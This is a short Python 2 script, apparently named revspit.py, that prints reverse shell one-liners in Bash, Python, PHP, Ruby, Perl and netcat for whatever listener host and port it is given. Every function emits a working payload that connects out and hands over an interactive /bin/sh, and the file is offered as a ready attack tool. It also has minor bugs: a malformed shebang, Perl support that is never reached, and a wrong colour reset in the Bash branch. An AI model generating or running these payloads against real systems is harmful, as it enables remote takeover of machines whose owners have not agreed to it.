#/usr/bin/env python2
import sys

errorRED = '\033[91m'
errorEND = '\033[0m'
goodGREEN = '\033[92m'
goodEND = '\033[0m'

def usage():
    print ("==================================================\n"
              "\n"
              "How to use:\n"
              "python revspit.py <LHOST> <LPORT> <format>\n"
              "\n"
              "Supported formats:\n"
              "BASH, PYTHON, RUBY, PERL, PHP, NETCAT\n"
              "==================================================\n")

def main():
           
    if SHELL == 'python':
       python()
       sys.exit()
    elif SHELL == 'ruby':
       ruby()
       sys.exit()
    elif SHELL == 'php':
       php()
       sys.exit()
    elif SHELL == 'bash':
       bash()
       sys.exit()
    elif SHELL == 'netcat':
        netcat()
        sys.exit()
    else:
        print(errorRED + "Language not supported." + errorEND +"\n")
        usage()
        sys.exit()
  
#PYTHON
def python():
    python = (goodGREEN + "PYTHON REVERSE SHELL:\n" + goodEND)
    python += ("""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%d));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""" % (LHOST,LPORT))
    print python

#PHP
def php():
    php =  (goodGREEN + "PHP REVERSE SHELL:\n" + goodEND)
    php += ("""php -r '$sock=fsockopen("%s",%d);exec("/bin/sh -i <&3 >&3 2>&3");'""" % (LHOST,LPORT))
    print php

#NETCAT
def netcat():
    netcat = (goodGREEN + "NETCAT REVERSE SHELLS\n" + goodEND)
    netcat += ("nc -e /bin/sh %s %d\n" % (LHOST,LPORT))
    netcat += ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %d >/tmp/f" % (LHOST,LPORT))
    print netcat
    
#RUBY
def ruby():
    ruby = (goodGREEN + "RUBY REVERSE SHELL:\n" + goodEND)
    ruby += ("""ruby -rsocket -e'f=TCPSocket.open("%s",%d).to_i;exec sprintf("/bin/sh -i <&%%d >&%%d 2>&%%d",f,f,f)'""" % (LHOST,LPORT))
    print ruby

#PERL
def perl():
    perl = (goodGREEN + "PERL REVERSE SHELL:\n" + goodEND)
    perl += ("""perl -e 'use Socket;$i="%s";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""" % (LHOST,LPORT))
    print perl

#BASH
def bash():
    bash = (goodGREEN +  "BASH REVERSE SHELL:\n" + goodGREEN)
    bash += ("bash -i >& /dev/tcp/%s/%d 0>&1" % (LHOST,LPORT))
    print bash


if len(sys.argv) != 4:
    usage()
    sys.exit()
    
elif __name__ == "__main__":
    LHOST = str(sys.argv[1])
    LPORT = int(sys.argv[2])
    SHELL = str(sys.argv[3].lower())
    main()

else:
    usage()
    sys.exit()
